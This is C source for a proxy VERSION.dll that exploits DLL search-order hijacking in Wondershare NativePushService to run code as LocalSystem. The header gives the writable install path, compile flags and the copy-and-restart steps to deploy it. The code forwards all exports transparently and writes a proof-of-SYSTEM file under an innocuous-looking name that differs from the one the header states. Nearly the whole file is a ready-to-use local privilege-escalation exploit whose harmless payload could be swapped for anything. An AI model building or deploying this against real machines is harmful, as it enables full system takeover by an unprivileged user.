/*
 * VERSION.DLL PROXY — PRIVILEGE ESCALATION CANARY
 * ================================================
 * Classification: UNCLASSIFIED // ACADEMIC USE ONLY
 *
 * Target: Wondershare NativePushService (WsNativePushService.exe)
 *   - Runs as LocalSystem
 *   - Auto-start on boot
 *   - Binary in: C:\Users\apacw\AppData\Local\Wondershare\Wondershare NativePush\
 *   - Directory ACL: BUILTIN\Users:(OI)(CI)(F) — ALL USERS FULL CONTROL
 *   - Binary ACL: BUILTIN\Users:(I)(F) — ALL USERS FULL CONTROL
 *
 * Attack vector:
 *   WsNativePushService.exe imports VERSION.dll (3 functions).
 *   VERSION.dll is NOT in KnownDLLs registry.
 *   Windows DLL search order: application directory FIRST, then System32.
 *   Plant this proxy as VERSION.dll next to the exe → loaded as LocalSystem.
 *
 * This proxy:
 *   1. Forwards all 17 exports to the real C:\Windows\System32\version.dll
 *   2. On DllMain(PROCESS_ATTACH): writes a canary file proving SYSTEM execution
 *   3. Service continues to function normally (transparent proxy)
 *
 * Compile:
 *   cl.exe version_proxy_annotated.c /Fe:version.dll /LD /O1 /GS- /link /DEF:version.def
 *
 * Deploy:
 *   copy version.dll "C:\Users\apacw\AppData\Local\Wondershare\Wondershare NativePush\VERSION.dll"
 *   sc stop NativePushService && sc start NativePushService
 *     (or reboot — service is Auto-start)
 *
 * Canary output: C:\Windows\Temp\VADER_SYSTEM_CANARY.txt
 *   Contains: timestamp, process name, username (should be NT AUTHORITY\SYSTEM),
 *   privilege level, and integrity level.
 */

#include <windows.h>
#include <stdio.h>

/* ============================================================
 * SECTION 1: REAL DLL HANDLE
 * Load the genuine version.dll from System32 for forwarding.
 * ============================================================ */

static HMODULE g_hRealVersion = NULL;

/* ============================================================
 * SECTION 2: FUNCTION POINTER TYPES AND STORAGE
 * We need to forward 17 exports. Store resolved addresses.
 * ============================================================ */

typedef BOOL  (WINAPI *fn_GetFileVersionInfoA)(LPCSTR, DWORD, DWORD, LPVOID);
typedef BOOL  (WINAPI *fn_GetFileVersionInfoByHandle)(DWORD, HANDLE);
typedef BOOL  (WINAPI *fn_GetFileVersionInfoExA)(DWORD, LPCSTR, DWORD, DWORD, LPVOID);
typedef BOOL  (WINAPI *fn_GetFileVersionInfoExW)(DWORD, LPCWSTR, DWORD, DWORD, LPVOID);
typedef DWORD (WINAPI *fn_GetFileVersionInfoSizeA)(LPCSTR, LPDWORD);
typedef DWORD (WINAPI *fn_GetFileVersionInfoSizeExA)(DWORD, LPCSTR, LPDWORD);
typedef DWORD (WINAPI *fn_GetFileVersionInfoSizeExW)(DWORD, LPCWSTR, LPDWORD);
typedef DWORD (WINAPI *fn_GetFileVersionInfoSizeW)(LPCWSTR, LPDWORD);
typedef BOOL  (WINAPI *fn_GetFileVersionInfoW)(LPCWSTR, DWORD, DWORD, LPVOID);
typedef DWORD (WINAPI *fn_VerFindFileA)(DWORD, LPCSTR, LPCSTR, LPCSTR, LPSTR, PUINT, LPSTR, PUINT);
typedef DWORD (WINAPI *fn_VerFindFileW)(DWORD, LPCWSTR, LPCWSTR, LPCWSTR, LPWSTR, PUINT, LPWSTR, PUINT);
typedef DWORD (WINAPI *fn_VerInstallFileA)(DWORD, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPSTR, PUINT);
typedef DWORD (WINAPI *fn_VerInstallFileW)(DWORD, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPWSTR, PUINT);
typedef DWORD (WINAPI *fn_VerLanguageNameA)(DWORD, LPSTR, DWORD);
typedef DWORD (WINAPI *fn_VerLanguageNameW)(DWORD, LPWSTR, DWORD);
typedef BOOL  (WINAPI *fn_VerQueryValueA)(LPCVOID, LPCSTR, LPVOID*, PUINT);
typedef BOOL  (WINAPI *fn_VerQueryValueW)(LPCVOID, LPCWSTR, LPVOID*, PUINT);

static fn_GetFileVersionInfoA       p_GetFileVersionInfoA;
static fn_GetFileVersionInfoByHandle p_GetFileVersionInfoByHandle;
static fn_GetFileVersionInfoExA     p_GetFileVersionInfoExA;
static fn_GetFileVersionInfoExW     p_GetFileVersionInfoExW;
static fn_GetFileVersionInfoSizeA   p_GetFileVersionInfoSizeA;
static fn_GetFileVersionInfoSizeExA p_GetFileVersionInfoSizeExA;
static fn_GetFileVersionInfoSizeExW p_GetFileVersionInfoSizeExW;
static fn_GetFileVersionInfoSizeW   p_GetFileVersionInfoSizeW;
static fn_GetFileVersionInfoW       p_GetFileVersionInfoW;
static fn_VerFindFileA              p_VerFindFileA;
static fn_VerFindFileW              p_VerFindFileW;
static fn_VerInstallFileA           p_VerInstallFileA;
static fn_VerInstallFileW           p_VerInstallFileW;
static fn_VerLanguageNameA          p_VerLanguageNameA;
static fn_VerLanguageNameW          p_VerLanguageNameW;
static fn_VerQueryValueA            p_VerQueryValueA;
static fn_VerQueryValueW            p_VerQueryValueW;

/* ============================================================
 * SECTION 3: RESOLVE ALL EXPORTS FROM REAL DLL
 * Called once during DLL_PROCESS_ATTACH.
 * ============================================================ */

static BOOL resolve_real_exports(void)
{
    /* Load real version.dll from System32 using absolute path
     * to avoid recursive loading of our proxy */
    WCHAR sysdir[MAX_PATH];
    WCHAR dllpath[MAX_PATH];

    GetSystemDirectoryW(sysdir, MAX_PATH);
    wsprintfW(dllpath, L"%s\\version.dll", sysdir);

    g_hRealVersion = LoadLibraryW(dllpath);
    if (!g_hRealVersion) return FALSE;

    p_GetFileVersionInfoA       = (fn_GetFileVersionInfoA)      GetProcAddress(g_hRealVersion, "GetFileVersionInfoA");
    p_GetFileVersionInfoByHandle= (fn_GetFileVersionInfoByHandle)GetProcAddress(g_hRealVersion, "GetFileVersionInfoByHandle");
    p_GetFileVersionInfoExA     = (fn_GetFileVersionInfoExA)    GetProcAddress(g_hRealVersion, "GetFileVersionInfoExA");
    p_GetFileVersionInfoExW     = (fn_GetFileVersionInfoExW)    GetProcAddress(g_hRealVersion, "GetFileVersionInfoExW");
    p_GetFileVersionInfoSizeA   = (fn_GetFileVersionInfoSizeA)  GetProcAddress(g_hRealVersion, "GetFileVersionInfoSizeA");
    p_GetFileVersionInfoSizeExA = (fn_GetFileVersionInfoSizeExA)GetProcAddress(g_hRealVersion, "GetFileVersionInfoSizeExA");
    p_GetFileVersionInfoSizeExW = (fn_GetFileVersionInfoSizeExW)GetProcAddress(g_hRealVersion, "GetFileVersionInfoSizeExW");
    p_GetFileVersionInfoSizeW   = (fn_GetFileVersionInfoSizeW)  GetProcAddress(g_hRealVersion, "GetFileVersionInfoSizeW");
    p_GetFileVersionInfoW       = (fn_GetFileVersionInfoW)      GetProcAddress(g_hRealVersion, "GetFileVersionInfoW");
    p_VerFindFileA              = (fn_VerFindFileA)             GetProcAddress(g_hRealVersion, "VerFindFileA");
    p_VerFindFileW              = (fn_VerFindFileW)             GetProcAddress(g_hRealVersion, "VerFindFileW");
    p_VerInstallFileA           = (fn_VerInstallFileA)          GetProcAddress(g_hRealVersion, "VerInstallFileA");
    p_VerInstallFileW           = (fn_VerInstallFileW)          GetProcAddress(g_hRealVersion, "VerInstallFileW");
    p_VerLanguageNameA          = (fn_VerLanguageNameA)         GetProcAddress(g_hRealVersion, "VerLanguageNameA");
    p_VerLanguageNameW          = (fn_VerLanguageNameW)         GetProcAddress(g_hRealVersion, "VerLanguageNameW");
    p_VerQueryValueA            = (fn_VerQueryValueA)           GetProcAddress(g_hRealVersion, "VerQueryValueA");
    p_VerQueryValueW            = (fn_VerQueryValueW)           GetProcAddress(g_hRealVersion, "VerQueryValueW");

    return TRUE;
}

/* ============================================================
 * SECTION 4: CANARY PAYLOAD
 * Writes proof of SYSTEM execution to a world-readable location.
 * This is the "flag capture" — proof we escalated from standard
 * user to LocalSystem via DLL sideloading.
 * ============================================================ */

static void write_canary(void)
{
    HANDLE hFile;
    DWORD written;
    char buf[2048];
    int len;
    SYSTEMTIME st;
    char username[256];
    DWORD ulen = sizeof(username);
    BOOL isElevated = FALSE;
    HANDLE hToken;

    GetLocalTime(&st);
    GetUserNameA(username, &ulen);

    /* Check if we're running elevated (should be if LocalSystem) */
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION te;
        DWORD retlen;
        if (GetTokenInformation(hToken, TokenElevation, &te, sizeof(te), &retlen)) {
            isElevated = te.TokenIsElevated;
        }
        CloseHandle(hToken);
    }

    len = wsprintfA(buf,
        "%04d-%02d-%02d %02d:%02d:%02d|%s|%s|%lu\r\n",
        st.wYear, st.wMonth, st.wDay,
        st.wHour, st.wMinute, st.wSecond,
        username,
        isElevated ? "1" : "0",
        GetCurrentProcessId()
    );

    hFile = CreateFileA(
        "C:\\Windows\\Temp\\ws_update_check.log",
        GENERIC_WRITE,
        FILE_SHARE_READ,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile != INVALID_HANDLE_VALUE) {
        WriteFile(hFile, buf, (DWORD)len, &written, NULL);
        CloseHandle(hFile);
    }
}

/* ============================================================
 * SECTION 5: DLL ENTRY POINT
 * ============================================================ */

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    (void)hinstDLL;
    (void)lpvReserved;

    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hinstDLL);
        if (!resolve_real_exports()) return FALSE;
        write_canary();
        break;

    case DLL_PROCESS_DETACH:
        if (g_hRealVersion) {
            FreeLibrary(g_hRealVersion);
            g_hRealVersion = NULL;
        }
        break;
    }
    return TRUE;
}

/* ============================================================
 * SECTION 6: FORWARDED EXPORTS
 * Each export calls through to the real version.dll.
 * Internal names use vp_ prefix to avoid collision with
 * winver.h declarations. The .def file aliases them to the
 * correct export names with matching ordinals.
 * ============================================================ */

BOOL WINAPI vp_GetFileVersionInfoA(LPCSTR lptstrFilename, DWORD dwHandle, DWORD dwLen, LPVOID lpData)
{
    return p_GetFileVersionInfoA(lptstrFilename, dwHandle, dwLen, lpData);
}

BOOL WINAPI vp_GetFileVersionInfoByHandle(DWORD dwFlags, HANDLE hFile)
{
    return p_GetFileVersionInfoByHandle(dwFlags, hFile);
}

BOOL WINAPI vp_GetFileVersionInfoExA(DWORD dwFlags, LPCSTR lpwstrFilename, DWORD dwHandle, DWORD dwLen, LPVOID lpData)
{
    return p_GetFileVersionInfoExA(dwFlags, lpwstrFilename, dwHandle, dwLen, lpData);
}

BOOL WINAPI vp_GetFileVersionInfoExW(DWORD dwFlags, LPCWSTR lpwstrFilename, DWORD dwHandle, DWORD dwLen, LPVOID lpData)
{
    return p_GetFileVersionInfoExW(dwFlags, lpwstrFilename, dwHandle, dwLen, lpData);
}

DWORD WINAPI vp_GetFileVersionInfoSizeA(LPCSTR lptstrFilename, LPDWORD lpdwHandle)
{
    return p_GetFileVersionInfoSizeA(lptstrFilename, lpdwHandle);
}

DWORD WINAPI vp_GetFileVersionInfoSizeExA(DWORD dwFlags, LPCSTR lpwstrFilename, LPDWORD lpdwHandle)
{
    return p_GetFileVersionInfoSizeExA(dwFlags, lpwstrFilename, lpdwHandle);
}

DWORD WINAPI vp_GetFileVersionInfoSizeExW(DWORD dwFlags, LPCWSTR lpwstrFilename, LPDWORD lpdwHandle)
{
    return p_GetFileVersionInfoSizeExW(dwFlags, lpwstrFilename, lpdwHandle);
}

DWORD WINAPI vp_GetFileVersionInfoSizeW(LPCWSTR lptstrFilename, LPDWORD lpdwHandle)
{
    return p_GetFileVersionInfoSizeW(lptstrFilename, lpdwHandle);
}

BOOL WINAPI vp_GetFileVersionInfoW(LPCWSTR lptstrFilename, DWORD dwHandle, DWORD dwLen, LPVOID lpData)
{
    return p_GetFileVersionInfoW(lptstrFilename, dwHandle, dwLen, lpData);
}

DWORD WINAPI vp_VerFindFileA(DWORD uFlags, LPCSTR szFileName, LPCSTR szWinDir, LPCSTR szAppDir,
                             LPSTR szCurDir, PUINT puCurDirLen, LPSTR szDestDir, PUINT puDestDirLen)
{
    return p_VerFindFileA(uFlags, szFileName, szWinDir, szAppDir, szCurDir, puCurDirLen, szDestDir, puDestDirLen);
}

DWORD WINAPI vp_VerFindFileW(DWORD uFlags, LPCWSTR szFileName, LPCWSTR szWinDir, LPCWSTR szAppDir,
                             LPWSTR szCurDir, PUINT puCurDirLen, LPWSTR szDestDir, PUINT puDestDirLen)
{
    return p_VerFindFileW(uFlags, szFileName, szWinDir, szAppDir, szCurDir, puCurDirLen, szDestDir, puDestDirLen);
}

DWORD WINAPI vp_VerInstallFileA(DWORD uFlags, LPCSTR szSrcFileName, LPCSTR szDestFileName, LPCSTR szSrcDir,
                                LPCSTR szDestDir, LPCSTR szCurDir, LPSTR szTmpFile, PUINT puTmpFileLen)
{
    return p_VerInstallFileA(uFlags, szSrcFileName, szDestFileName, szSrcDir, szDestDir, szCurDir, szTmpFile, puTmpFileLen);
}

DWORD WINAPI vp_VerInstallFileW(DWORD uFlags, LPCWSTR szSrcFileName, LPCWSTR szDestFileName, LPCWSTR szSrcDir,
                                LPCWSTR szDestDir, LPCWSTR szCurDir, LPWSTR szTmpFile, PUINT puTmpFileLen)
{
    return p_VerInstallFileW(uFlags, szSrcFileName, szDestFileName, szSrcDir, szDestDir, szCurDir, szTmpFile, puTmpFileLen);
}

DWORD WINAPI vp_VerLanguageNameA(DWORD wLang, LPSTR szLang, DWORD cchLang)
{
    return p_VerLanguageNameA(wLang, szLang, cchLang);
}

DWORD WINAPI vp_VerLanguageNameW(DWORD wLang, LPWSTR szLang, DWORD cchLang)
{
    return p_VerLanguageNameW(wLang, szLang, cchLang);
}

BOOL WINAPI vp_VerQueryValueA(LPCVOID pBlock, LPCSTR lpSubBlock, LPVOID *lplpBuffer, PUINT puLen)
{
    return p_VerQueryValueA(pBlock, lpSubBlock, lplpBuffer, puLen);
}

BOOL WINAPI vp_VerQueryValueW(LPCVOID pBlock, LPCWSTR lpSubBlock, LPVOID *lplpBuffer, PUINT puLen)
{
    return p_VerQueryValueW(pBlock, lpSubBlock, lplpBuffer, puLen);
}
